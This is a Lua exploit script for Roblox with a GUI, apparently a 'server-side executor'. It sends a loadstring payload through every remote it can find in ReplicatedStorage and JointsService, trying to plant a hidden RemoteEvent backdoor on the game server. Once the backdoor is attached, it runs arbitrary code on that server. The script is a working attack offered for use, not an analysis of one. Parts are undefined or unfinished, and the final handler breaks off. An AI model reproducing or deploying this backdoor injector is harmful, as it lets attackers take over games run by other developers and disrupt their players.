-- Project Tigma

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local JS = game:GetService("JointsService")
local LP = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")

local injected = false
local attachedRemote = nil
local playerName = LP.Name

local function notify(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 5
        })
    end)
end

local HubScrolling = Instance.new("ScrollingFrame")
HubScrolling.Parent = LMG2L["Frame7_15"]

HubScrolling.BorderSizePixel = 0

local HubLayout = Instance.new("UIListLayout")
HubLayout.Parent = HubScrolling
HubLayout.Padding = UDim.new(0,5)
HubLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function AddHubScript(name, code)
    local btn = Instance.new("TextButton")
    btn.Parent = HubScrolling
    btn.BackgroundColor3 = Color3.fromRGB(80,80,90)
    btn.Size = UDim2.new(1,0,0,30)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(220,220,235)
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 13
    btn.TextWrapped = true
    
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0,4)
    
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(255,255,255)
    stroke.Thickness = 1
    
    btn.MouseButton1Click:Connect(function()
        local final = code:gsub('""', '"'..playerName..'"')
                          :gsub("''", "'"..playerName.."'")
                          :gsub('"name"', '"'..playerName..'"')
                          :gsub('"username"', '"'..playerName..'"')
                          :gsub('"plr"', '"'..playerName..'"')
        LMG2L["TextBox_1b"].Text = final
    end)
end

LMG2L["TextButton3_9"].MouseButton1Click:Connect(function()
    if injected then 
        notify("Already","Backdoor attached.") 
        return 
    end 
    
    local bn = "_PIPAZZ_BYPASS" .. math.random(10000,99999)
    
    local injector = [[
        local JS=game:GetService("JointsService")
        local bn="]]..bn..[["
        if not JS:FindFirstChild(bn)then 
            local e=Instance.new("RemoteEvent") 
            e.Name=bn 
            e.Parent=JS 
            e.OnServerEvent:Connect(function(p,cd)
                local f,e=loadstring(cd) 
                if f then pcall(f) end 
            end)
        end
    ]]
    
    local function ti(r)
        pcall(function()
            if r:IsA("RemoteEvent") then
                r:FireServer(injector)
            elseif r:IsA("RemoteFunction") then
                r:InvokeServer(injector)
            end
        end)
    end
    
    task.spawn(function() for _,v in ipairs(RS:GetChildren()) do ti(v) end end)
    task.spawn(function() for _,v in ipairs(JS:GetChildren()) do ti(v) end end)
    
    local w = 0
    while w < 1.2 do 
        if JS:FindFirstChild(bn) then break end 
        task.wait(0.025) 
        w = w + 0.025 
    end 
    
    local br = JS:FindFirstChild(bn)
    if br and br:IsA("RemoteEvent") then 
        injected = true
        attachedRemote = br
        LMG2L["TextButton3_9"].Text = "SUCCESS!"
        LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(50,120,60)
        notify("Inject Success","Backdoor & GUI activated.")
    else 
        notify("Inject Failed","No backdoor.")
        LMG2L["TextButton3_9"].Text = "no backdoor!"
        LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(140,50,50)
    end 
end)

LMG2L["TextButton_b"].MouseButton1Click:Connect(function()
    if not injected or not attachedRemote then 
        notify("Error", "Inject first.")
        return 
    end 
    
    local code = LMG2L["TextBox_1b"].Text 
    if code:match("^%s*$") then 
        notify("Error", "No script.")
        return 
    end 
    
    local pats = {'"yourusername"','"username"','"name"','"plr"','"player"'}
    for _,p in pats do code = code:gsub(p, '"'..playerName..'"') end
    
    pcall(function()
        attachedRemote:FireServer(code)
        notify("Executed", "Done.")
    end)
end)

LMG2L["TextButton2_7"].MouseButton1Click:Connect(function()
    LMG2L["TextBox_1b"].Text = "" 
    notify("Cleared", "Input cleared.")
end)

LMG2L["TextButton4_10"].MouseButton1Click:Connect(function()
    if not injected or not attachedRemote then

    pcall(function()
        attachedRemote:FireServer(r6_code)
    end)
end)
